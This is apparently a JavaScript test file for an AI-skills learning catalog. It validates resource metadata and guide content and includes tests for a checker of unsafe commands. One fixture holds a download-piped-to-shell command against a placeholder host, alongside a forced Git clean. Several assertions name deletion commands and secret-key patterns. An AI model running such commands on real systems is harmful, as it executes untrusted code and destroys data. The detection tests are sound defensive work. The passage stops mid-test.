import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import test from "node:test";
import {
  buildAssessmentHistory,
  buildCapstoneHistory,
  buildPortableLearnerRecord,
  buildTranscriptCsv,
  buildTranscript,
  createEmptyProgress,
  fieldGuideCatalog,
  getResourceFreshness,
  learningCatalog,
  recordAssessmentAttempt,
  recordCapstoneSubmission,
  recordModuleVisit,
  restorePortableLearnerRecord,
  scoreKnowledgeCheck,
  starterCatalog,
  validateCatalog,
  validateFieldGuideCatalog,
  validateLearningCatalog,
  validatePortableLearnerRecord,
} from "../dist/index.js";
import {
  findMissingArtifactFields,
  findUnsafeArtifactCommands,
  hasRecoveryGuidance,
  hasVerificationGuidance,
  normalizeRequiredArtifactFields,
} from "../scripts/resource-pack-rules.mjs";

test("starter catalog is valid", () => {
  assert.deepEqual(validateCatalog(starterCatalog), { valid: true, errors: [] });
  assert.deepEqual(validateLearningCatalog(learningCatalog), {
    valid: true,
    errors: [],
  });
  assert.deepEqual(validateFieldGuideCatalog(fieldGuideCatalog), {
    valid: true,
    errors: [],
  });
  assert.equal(learningCatalog.paths.length, starterCatalog.paths.length);
  assert.equal(learningCatalog.modules.length, starterCatalog.modules.length);
  assert.equal(fieldGuideCatalog.resources.length, starterCatalog.resources.length);
  assert.equal(starterCatalog.contentVersion, "0.42.0");
  assert.equal(starterCatalog.paths[0].moduleIds.length, 16);
  const referencedModuleIds = new Set(
    starterCatalog.paths.flatMap((path) => path.moduleIds),
  );
  assert.equal(starterCatalog.modules.length, referencedModuleIds.size);
});

test("resources publish complete discovery, ownership, and review metadata", () => {
  const slugs = new Set();

  for (const resource of starterCatalog.resources) {
    assert.match(resource.slug, /^[a-z0-9]+(?:-[a-z0-9]+)*$/);
    assert.equal(slugs.has(resource.slug), false);
    slugs.add(resource.slug);
    assert.ok(resource.audience.length > 0);
    assert.ok(resource.format);
    assert.ok(Array.isArray(resource.prerequisites));
    assert.equal(resource.owner, "project42-editorial");
    assert.ok(resource.reviewCadenceDays >= 30);
    assert.ok(resource.reviewCadenceDays <= 90);
    assert.ok(resource.tags.length > 0);
    assert.ok(resource.providers.length > 0);
    assert.ok(resource.sources.length > 0);
  }
});

test("derives resource freshness without persisting a time-sensitive status", () => {
  const resource = {
    lastVerified: "2026-01-01",
    reviewCadenceDays: 100,
  };

  assert.deepEqual(getResourceFreshness(resource, "2026-02-01"), {
    status: "current",
    reviewedOn: "2026-01-01",
    dueOn: "2026-04-11",
    daysSinceReview: 31,
    daysUntilDue: 69,
  });
  assert.equal(
    getResourceFreshness(resource, "2026-03-25").status,
    "review-due",
  );
  assert.equal(getResourceFreshness(resource, "2026-04-12").status, "stale");
  assert.throws(
    () => getResourceFreshness({ ...resource, reviewCadenceDays: 0 }, "2026-02-01"),
    /reviewCadenceDays/,
  );
  assert.throws(
    () => getResourceFreshness(resource, "not-a-date"),
    /asOf/,
  );
});

test("rejects incomplete, ambiguous, or unsafe resource metadata", () => {
  const broken = structuredClone(starterCatalog);
  const first = broken.resources[0];
  const second = broken.resources[1];
  first.slug = "Not a route";
  first.format = "video";
  first.audience = ["learner", "learner"];
  first.prerequisites = ["", ""];
  first.owner = "Editorial Team";
  first.reviewCadenceDays = 0;
  first.tags = ["valid", "Not Valid"];
  second.slug = broken.resources[2].slug;

  const validation = validateCatalog(broken);

  assert.equal(validation.valid, false);
  for (const expected of [
    "Resource ai-glossary has an invalid slug: Not a route",
    "Resource ai-glossary has an invalid format: video",
    "Resource ai-glossary has invalid or duplicate audience values",
    "Resource ai-glossary has empty or duplicate prerequisites",
    "Resource ai-glossary has an invalid owner: Editorial Team",
    "Resource ai-glossary has an invalid review cadence",
    "Resource ai-glossary has invalid or duplicate tags",
    `Duplicate resource slug: ${broken.resources[2].slug}`,
  ]) {
    assert.ok(validation.errors.includes(expected), expected);
  }
});

test("reports missing new resource arrays instead of throwing on legacy JSON", () => {
  const broken = structuredClone(starterCatalog);
  delete broken.resources[0].audience;
  delete broken.resources[0].prerequisites;

  const validation = validateCatalog(broken);

  assert.equal(validation.valid, false);
  assert.ok(
    validation.errors.includes(
      "Resource ai-glossary has invalid or duplicate audience values",
    ),
  );
});

test("publishes six source-backed prompting and context field guides", () => {
  const expected = new Map([
    ["task-framing-contract", "template"],
    ["prompt-pattern-decision-guide", "decision-path"],
    ["context-selection-checklist", "checklist"],
    ["context-refresh-runbook", "playbook"],
    ["structured-output-contract", "how-to"],
    ["reusable-prompt-template-pack", "template"],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 13);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    assert.equal(resource.format, expected.get(resource.id));
    assert.ok(resource.providers.includes("provider-neutral"));
    assert.ok(resource.audience.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.ok(resource.prerequisites);
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) =>
        section.title.toLowerCase().includes("expected result and verification"),
      ),
      `${resource.id} must state its expected result and verification`,
    );
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a reusable template with safe placeholders`,
    );
    assert.ok(resource.sources.length >= 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("prompting and context templates preserve safety and evidence boundaries", () => {
  const resources = starterCatalog.resources.filter((resource) =>
    [
      "task-framing-contract",
      "prompt-pattern-decision-guide",
      "context-selection-checklist",
      "context-refresh-runbook",
      "structured-output-contract",
      "reusable-prompt-template-pack",
    ].includes(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.sections.flatMap((section) => [
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n")
    .toLowerCase();

  for (const required of [
    "expected result",
    "verify",
    "evidence",
    "secret",
    "untrusted",
  ]) {
    assert.ok(text.includes(required), `field-guide pack must cover ${required}`);
  }
  assert.doesNotMatch(text, /\bsk-[a-z0-9]{12,}\b/i);

  const structured = starterCatalog.resources.find(
    (resource) => resource.id === "structured-output-contract",
  );
  const envelope = structured?.sections.find(
    (section) => section.id === "define-output-envelope",
  )?.code?.code;
  assert.ok(envelope);
  assert.equal(JSON.parse(envelope).contractVersion, "1.0");
});

test("publishes five source-backed research and verification field guides", () => {
  const expected = new Map([
    ["source-authority-ladder", "decision-path"],
    ["claim-decomposition-map", "template"],
    ["citation-support-checklist", "checklist"],
    ["fact-verification-workflow", "playbook"],
    ["consequence-based-review-gate", "decision-path"],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 18);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    assert.equal(resource.format, expected.get(resource.id));
    assert.ok(resource.providers.includes("provider-neutral"));
    assert.ok(resource.prerequisites.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) =>
        section.title.toLowerCase().includes("expected evidence"),
      ),
      `${resource.id} must define expected evidence`,
    );
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a safe reusable record`,
    );
    assert.equal(resource.sources.length, 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("research guides distinguish evidence from unsupported confidence", () => {
  const ids = new Set([
    "source-authority-ladder",
    "claim-decomposition-map",
    "citation-support-checklist",
    "fact-verification-workflow",
    "consequence-based-review-gate",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.sections.flatMap((section) => [
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n")
    .toLowerCase();

  for (const required of [
    "atomic claim",
    "contradict",
    "primary",
    "scope",
    "unknown",
    "consequence",
    "professional",
  ]) {
    assert.ok(text.includes(required), `research pack must cover ${required}`);
  }
  assert.doesNotMatch(text, /\bsk-[a-z0-9]{12,}\b/i);

  const citations = starterCatalog.resources.find(
    (resource) => resource.id === "citation-support-checklist",
  );
  assert.deepEqual(
    new Set(citations?.sources.map((source) => source.publisher)),
    new Set(["OpenAI", "Anthropic", "Google"]),
  );
});

test("publishes six source-backed AI coding-agent field guides", () => {
  const expected = new Map([
    ["repository-orientation-checklist", "checklist"],
    ["coding-agent-work-plan-template", "template"],
    ["coding-agent-permission-boundaries", "decision-path"],
    ["implementation-evidence-loop", "playbook"],
    ["ai-assisted-code-review-checklist", "checklist"],
    ["test-debug-handoff", "template"],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 24);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    assert.equal(resource.format, expected.get(resource.id));
    assert.ok(resource.providers.includes("provider-neutral"));
    assert.ok(resource.prerequisites.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) =>
        section.title.toLowerCase().includes("expected evidence"),
      ),
      `${resource.id} must define expected evidence`,
    );
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a safe reusable record`,
    );
    assert.equal(resource.sources.length, 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("coding-agent guides preserve scope, permission, and verification boundaries", () => {
  const ids = new Set([
    "repository-orientation-checklist",
    "coding-agent-work-plan-template",
    "coding-agent-permission-boundaries",
    "implementation-evidence-loop",
    "ai-assisted-code-review-checklist",
    "test-debug-handoff",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.sections.flatMap((section) => [
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n")
    .toLowerCase();

  for (const required of [
    "scope",
    "permission",
    "least-privilege",
    "evidence",
    "secret",
    "recovery",
    "independent",
    "reproduce",
    "system of record",
  ]) {
    assert.ok(text.includes(required), `coding-agent pack must cover ${required}`);
  }
  assert.doesNotMatch(text, /\bsk-[a-z0-9]{12,}\b/i);
  assert.doesNotMatch(text, /\b(rm\s+-rf|remove-item\s+-recurse)\b/i);
});

test("publishes five source-backed MCP and orchestration field guides", () => {
  const expected = new Map([
    ["mcp-primitives-reference", "reference"],
    ["mcp-server-trust-review", "checklist"],
    ["tool-contract-design-template", "template"],
    ["orchestration-pattern-decision-guide", "decision-path"],
    ["agent-handoff-evidence-contract", "template"],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 29);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    assert.equal(resource.format, expected.get(resource.id));
    assert.ok(resource.providers.includes("provider-neutral"));
    assert.ok(resource.prerequisites.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) =>
        section.title.toLowerCase().includes("expected evidence"),
      ),
      `${resource.id} must define expected evidence`,
    );
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a safe reusable record`,
    );
    assert.ok(resource.sources.length >= 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("MCP and orchestration guides preserve trust and handoff boundaries", () => {
  const ids = new Set([
    "mcp-primitives-reference",
    "mcp-server-trust-review",
    "tool-contract-design-template",
    "orchestration-pattern-decision-guide",
    "agent-handoff-evidence-contract",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.sections.flatMap((section) => [
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n")
    .toLowerCase();

  for (const required of [
    "host",
    "capabilities",
    "audience",
    "least-privilege",
    "side effect",
    "idempotency",
    "system of record",
    "rollback",
    "receiver",
    "human",
  ]) {
    assert.ok(text.includes(required), `MCP/orchestration pack must cover ${required}`);
  }
  assert.doesNotMatch(text, /\b(client_secret|access_token)\s*[:=]\s*[\"'][^\\[<]/i);
  assert.doesNotMatch(text, /\b(rm\s+-rf|remove-item\s+-recurse)\b/i);
});

test("publishes six source-backed Anthropic and OpenAI workflow references", () => {
  const expected = new Map([
    ["anthropic-messages-api-request", ["playbook", "anthropic"]],
    ["anthropic-tools-structured-output", ["reference", "anthropic"]],
    ["anthropic-evaluation-error-triage", ["playbook", "anthropic"]],
    ["openai-responses-api-request", ["playbook", "openai"]],
    ["openai-tools-structured-output", ["reference", "openai"]],
    ["openai-evaluation-error-triage", ["playbook", "openai"]],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 35);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    const [format, provider] = expected.get(resource.id);
    assert.equal(resource.format, format);
    assert.deepEqual(resource.providers, [provider]);
    assert.ok(resource.prerequisites.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.equal(resource.reviewCadenceDays, 30);
    assert.equal(resource.lastVerified, "2026-07-25");
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a reusable example or evidence record`,
    );
    assert.equal(resource.sources.length, 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("provider workflow references keep credentials, execution, and recovery bounded", () => {
  const ids = new Set([
    "anthropic-messages-api-request",
    "anthropic-tools-structured-output",
    "anthropic-evaluation-error-triage",
    "openai-responses-api-request",
    "openai-tools-structured-output",
    "openai-evaluation-error-triage",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.prerequisites,
      ...resource.sections.flatMap((section) => [
        section.title,
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n");

  for (const resource of resources) {
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
  }
  for (const required of [
    "ANTHROPIC_API_KEY",
    "PROJECT42_ANTHROPIC_MODEL",
    "OPENAI_API_KEY",
    "PROJECT42_OPENAI_MODEL",
    "Expected",
    "Verify",
    "rollback",
    "request ID",
    "idempotency",
  ]) {
    assert.ok(text.includes(required), `provider workflow pack must cover ${required}`);
  }
  assert.doesNotMatch(text, /\bsk-[a-z0-9_-]{12,}\b/i);
  assert.doesNotMatch(text, /(?:api[_ -]?key|authorization)\s*[:=]\s*["'][^$[<]/i);
  assert.doesNotMatch(text, /(?:users[\\/][^\\/]+|[a-z]:\\users\\)/i);
});

test("publishes five source-backed Google and cross-provider workflow references", () => {
  const expected = new Map([
    ["google-gemini-interactions-api-request", ["playbook", ["google"]]],
    ["google-gemini-tools-structured-output", ["reference", ["google"]]],
    ["google-gemini-evaluation-error-triage", ["playbook", ["google"]]],
    [
      "cross-provider-runtime-configuration",
      ["template", ["provider-neutral", "anthropic", "openai", "google"]],
    ],
    [
      "cross-provider-evaluation-migration-workflow",
      ["playbook", ["provider-neutral", "anthropic", "openai", "google"]],
    ],
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    expected.has(resource.id),
  );

  assert.ok(starterCatalog.resources.length >= 40);
  assert.equal(resources.length, expected.size);
  for (const resource of resources) {
    const [format, providers] = expected.get(resource.id);
    assert.equal(resource.format, format);
    assert.deepEqual(resource.providers, providers);
    assert.ok(resource.prerequisites.length > 0);
    assert.equal(resource.owner, "project42-editorial");
    assert.equal(resource.reviewCadenceDays, 30);
    assert.equal(resource.lastVerified, "2026-07-25");
    assert.equal(resource.sections.length, 3);
    assert.ok(
      resource.sections.some((section) => section.code?.code.includes("[")),
      `${resource.id} must include a reusable example or evidence record`,
    );
    assert.ok(resource.sources.length >= 3);
    assert.ok(
      resource.sources.every((source) => source.lastVerified === "2026-07-25"),
    );
  }
});

test("Google and cross-provider workflows preserve state, capability, and migration boundaries", () => {
  const ids = new Set([
    "google-gemini-interactions-api-request",
    "google-gemini-tools-structured-output",
    "google-gemini-evaluation-error-triage",
    "cross-provider-runtime-configuration",
    "cross-provider-evaluation-migration-workflow",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const text = resources
    .flatMap((resource) => [
      resource.summary,
      ...resource.prerequisites,
      ...resource.sections.flatMap((section) => [
        section.title,
        ...section.paragraphs,
        section.callout ?? "",
        section.code?.code ?? "",
      ]),
    ])
    .join("\n");
  const normalized = text.toLowerCase();

  for (const resource of resources) {
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
  }
  for (const required of [
    "GEMINI_API_KEY",
    "PROJECT42_GEMINI_MODEL",
    "PROJECT42_GEMINI_API_VERSION",
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "false one-to-one",
    "state",
    "retention",
    "capability",
    "evaluation",
    "rollback",
    "reconcile",
  ]) {
    assert.ok(
      normalized.includes(required.toLowerCase()),
      `Google/cross-provider pack must cover ${required}`,
    );
  }
  assert.doesNotMatch(text, /\b(?:AIza|sk-|ghp_)[a-z0-9_-]{12,}\b/i);
  assert.doesNotMatch(text, /(?:api[_ -]?key|authorization)\s*[:=]\s*["'][^$[<]/i);
  assert.doesNotMatch(text, /(?:users[\\/][^\\/]+|[a-z]:\\users\\)/i);
});

test("provider workflow pack has exact provider, credential, and safety coverage", () => {
  const ids = new Set([
    "anthropic-messages-api-request",
    "anthropic-tools-structured-output",
    "anthropic-evaluation-error-triage",
    "openai-responses-api-request",
    "openai-tools-structured-output",
    "openai-evaluation-error-triage",
    "google-gemini-interactions-api-request",
    "google-gemini-tools-structured-output",
    "google-gemini-evaluation-error-triage",
    "cross-provider-runtime-configuration",
    "cross-provider-evaluation-migration-workflow",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const profileCounts = resources.reduce((counts, resource) => {
    const key = [...resource.providers].sort().join("+");
    counts.set(key, (counts.get(key) ?? 0) + 1);
    return counts;
  }, new Map());

  assert.equal(resources.length, 11);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  assert.deepEqual(
    profileCounts,
    new Map([
      ["anthropic", 3],
      ["openai", 3],
      ["google", 3],
      ["anthropic+google+openai+provider-neutral", 2],
    ]),
  );

  const providerCredentials = new Map([
    ["anthropic", "ANTHROPIC_API_KEY"],
    ["openai", "OPENAI_API_KEY"],
    ["google", "GEMINI_API_KEY"],
  ]);
  for (const [provider, credential] of providerCredentials) {
    const providerText = resources
      .filter((resource) => resource.providers.includes(provider))
      .map((resource) => JSON.stringify(resource))
      .join("\n");
    assert.ok(
      providerText.includes(credential),
      `provider pack must document ${credential}`,
    );
  }
  for (const resource of resources) {
    assert.equal(resource.slug, resource.id);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    assert.ok(resource.sources.length >= 3);
  }
});

test("coding-agent and MCP operational pack has exact, safe acceptance coverage", () => {
  const ids = new Set([
    "repository-orientation-checklist",
    "coding-agent-work-plan-template",
    "coding-agent-permission-boundaries",
    "implementation-evidence-loop",
    "ai-assisted-code-review-checklist",
    "test-debug-handoff",
    "mcp-primitives-reference",
    "mcp-server-trust-review",
    "tool-contract-design-template",
    "orchestration-pattern-decision-guide",
    "agent-handoff-evidence-contract",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );

  assert.equal(resources.length, 11);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  for (const resource of resources) {
    assert.equal(resource.slug, resource.id);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    assert.ok(resource.sources.length >= 3);
  }
});

test("publishes five evaluation and safety playbooks with release controls", () => {
  const ids = new Set([
    "evaluation-plan-charter",
    "representative-evaluation-dataset",
    "evidence-based-evaluation-rubric",
    "bounded-ai-red-team-exercise",
    "human-controlled-ai-release-gate",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );

  assert.equal(resources.length, 5);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  for (const resource of resources) {
    assert.equal(resource.slug, resource.id);
    assert.deepEqual(resource.providers, ["provider-neutral"]);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    assert.ok(resource.sources.length >= 3);
    const text = JSON.stringify(resource);
    assert.match(text, /Stop criteria/i, `${resource.id} stop criteria`);
    assert.match(text, /Owner and cadence/i, `${resource.id} ownership`);
  }

  const redTeam = resources.find(
    (resource) => resource.id === "bounded-ai-red-team-exercise",
  );
  assert.ok(redTeam.audience.includes("operator"));
  assert.match(JSON.stringify(redTeam), /Written authorization/i);

  const releaseGate = resources.find(
    (resource) => resource.id === "human-controlled-ai-release-gate",
  );
  assert.match(JSON.stringify(releaseGate), /PROMOTE \| HOLD \| REJECT/);
  assert.match(JSON.stringify(releaseGate), /accountability.*human/i);
});

test("publishes five troubleshooting and operations playbooks with bounded recovery", () => {
  const ids = new Set([
    "ai-api-failure-triage",
    "agent-tool-failure-recovery",
    "context-quality-regression-triage",
    "ai-incident-triage",
    "ai-rollback-and-incident-closeout",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );

  assert.equal(resources.length, 5);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  for (const resource of resources) {
    assert.equal(resource.slug, resource.id);
    assert.deepEqual(resource.providers, ["provider-neutral"]);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    assert.ok(resource.sources.length >= 3);
    const text = JSON.stringify(resource);
    assert.match(text, /Owner and cadence/i, `${resource.id} ownership`);
    assert.match(text, /Stop criteria/i, `${resource.id} stop criteria`);
    assert.match(text, /Verification:/i, `${resource.id} artifact verification`);
  }

  const api = resources.find(
    (resource) => resource.id === "ai-api-failure-triage",
  );
  assert.match(JSON.stringify(api), /SDK \+ PROXY \+ APP/);
  assert.match(JSON.stringify(api), /Do not retry authentication/i);

  const tools = resources.find(
    (resource) => resource.id === "agent-tool-failure-recovery",
  );
  assert.match(JSON.stringify(tools), /SUCCESS \| FAILURE \| UNKNOWN/);
  assert.match(JSON.stringify(tools), /reconciling the target before retry/i);

  const closeout = resources.find(
    (resource) => resource.id === "ai-rollback-and-incident-closeout",
  );
  assert.match(JSON.stringify(closeout), /reconciled operation journal/i);
  assert.match(JSON.stringify(closeout), /Do not close when/i);
});

test("evaluation safety and operations pack has exact ten-resource acceptance coverage", () => {
  const ids = new Set([
    "evaluation-plan-charter",
    "representative-evaluation-dataset",
    "evidence-based-evaluation-rubric",
    "bounded-ai-red-team-exercise",
    "human-controlled-ai-release-gate",
    "ai-api-failure-triage",
    "agent-tool-failure-recovery",
    "context-quality-regression-triage",
    "ai-incident-triage",
    "ai-rollback-and-incident-closeout",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );
  const categoryCounts = resources.reduce((counts, resource) => {
    counts.set(resource.category, (counts.get(resource.category) ?? 0) + 1);
    return counts;
  }, new Map());

  assert.equal(resources.length, 10);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  assert.deepEqual(
    categoryCounts,
    new Map([
      ["Evaluation and safety", 5],
      ["Troubleshooting and operations", 5],
    ]),
  );
  assert.ok(new Set(resources.map((resource) => resource.format)).size >= 5);

  for (const resource of resources) {
    assert.deepEqual(resource.providers, ["provider-neutral"]);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    const artifact = resource.sections
      .map((section) => section.code?.code ?? "")
      .join("\n");
    for (const field of [
      "Owner and cadence:",
      "Stop criteria:",
    ]) {
      assert.ok(artifact.includes(field), `${resource.id} ${field}`);
    }
  }
});

test("self-hosted model operations pack has exact deployment and recovery coverage", () => {
  const ids = new Set([
    "self-hosted-deployment-shape-decision",
    "workstation-model-service-runbook",
    "container-on-prem-model-service-runbook",
    "edge-model-service-runbook",
    "cloud-managed-model-compute-runbook",
    "self-hosted-model-security-boundary",
    "self-hosted-model-evaluation-capacity-observability",
    "self-hosted-model-update-rollback-incident",
  ]);
  const resources = starterCatalog.resources.filter((resource) =>
    ids.has(resource.id),
  );

  assert.equal(resources.length, 8);
  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
  assert.ok(new Set(resources.map((resource) => resource.format)).size >= 5);

  for (const resource of resources) {
    assert.equal(resource.category, "Self-hosted model operations");
    assert.deepEqual(resource.providers, ["provider-neutral"]);
    assert.ok(resource.sources.length >= 3, `${resource.id} sources`);
    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
    const artifact = resource.sections
      .map((section) => section.code?.code ?? "")
      .join("\n");
    for (const field of [
      "Task:",
      "Scope:",
      "Permissions:",
      "Exact build:",
      "Verification:",
      "Stop conditions:",
      "Recovery:",
    ]) {
      assert.ok(artifact.includes(field), `${resource.id} ${field}`);
    }
  }

  const serialized = new Map(
    resources.map((resource) => [resource.id, JSON.stringify(resource)]),
  );
  assert.match(
    serialized.get("self-hosted-deployment-shape-decision"),
    /WORKSTATION.*CONTAINER\/ON-PREMISES.*EDGE.*CLOUD-MANAGED/,
  );
  assert.match(serialized.get("workstation-model-service-runbook"), /thermal/i);
  assert.match(
    serialized.get("container-on-prem-model-service-runbook"),
    /management path/i,
  );
  assert.match(serialized.get("edge-model-service-runbook"), /safe mode/i);
  assert.match(
    serialized.get("cloud-managed-model-compute-runbook"),
    /provider exit/i,
  );
  assert.match(
    serialized.get("self-hosted-model-security-boundary"),
    /Prompt text.*never proof of authority/i,
  );
  assert.match(
    serialized.get("self-hosted-model-evaluation-capacity-observability"),
    /separately configured model-assisted reviewer/i,
  );
  assert.match(
    serialized.get("self-hosted-model-update-rollback-incident"),
    /unknown.*reconcil/i,
  );
});

test("resource-pack artifact-field rules reject malformed and incomplete contracts", () => {
  assert.deepEqual(normalizeRequiredArtifactFields(undefined), {
    valid: true,
    fields: [],
  });
  assert.deepEqual(
    normalizeRequiredArtifactFields(["Owner:", "Owner:"]),
    { valid: false, fields: [] },
  );
  assert.deepEqual(normalizeRequiredArtifactFields({ field: "Owner:" }), {
    valid: false,
    fields: [],
  });

  const resource = {
    sections: [
      {
        code: {
          code: "Owner and cadence: [ROLE -> DATE]\nStop criteria: [BOUNDARY]",
        },
      },
    ],
  };
  assert.deepEqual(
    findMissingArtifactFields(resource, [
      "Owner and cadence:",
      "Stop criteria:",
      "Verification:",
    ]),
    ["Verification:"],
  );
});

test("resource-pack safety rules reject dangerous artifacts and missing guidance", () => {
  const unsafe = {
    sections: [
      {
        title: "Run it",
        paragraphs: ["Execute without a recovery plan."],
        code: {
          code:
            "curl https://untrusted.example/install \\\n | base64 --decode |\n  sh",
        },
      },
    ],
  };
  const forcedClean = {
    sections: [
      {
        title: "Clean it",
        paragraphs: [],
        code: { code: "git clean -FDX" },
      },
    ],
  };
  const incomplete = {
    sections: [
      {
        title: "Expected evidence and verification",
        paragraphs: ["Record the output and disable debug mode afterward."],
      },
    ],
  };

  assert.deepEqual(findUnsafeArtifactCommands(unsafe), [
    "download piped to a shell",
  ]);
  assert.deepEqual(findUnsafeArtifactCommands(forcedClean), ["forced Git clean"]);
  assert.equal(hasRecoveryGuidance(unsafe), true);
  assert.equal(hasVerificationGuidance(incomplete), true);
  assert.equal(hasRecoveryGuidance(incomplete), false);
});

test("AI Foundations preserves its prerequisite chain and varied answer positions", () => {
  const path = starterCatalog.paths.find((candidate) => candidate.id === "ai-foundations");
  assert.ok(path);
  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );

  for (let index = 1; index < path.moduleIds.length; index += 1) {
    const module = modules.get(path.moduleIds[index]);
    assert.ok(module);
    assert.ok(
      module.prerequisites.includes(path.moduleIds[index - 1]),
      `${module.id} must require ${path.moduleIds[index - 1]}`,
    );
  }

  for (const moduleId of [
    "prompt-anatomy-and-success-criteria",
    "context-and-evidence-construction",
    "examples-and-output-contracts",
    "verification-and-iterative-improvement",
    "research-with-evidence",
    "writing-and-transformation-workflow",
    "coding-and-analysis-workflow",
    "safe-tool-use-workflow",
    "ai-foundations-capstone",
  ]) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
  }
});

test("validates capstone contracts and rejects an incomplete rubric", () => {
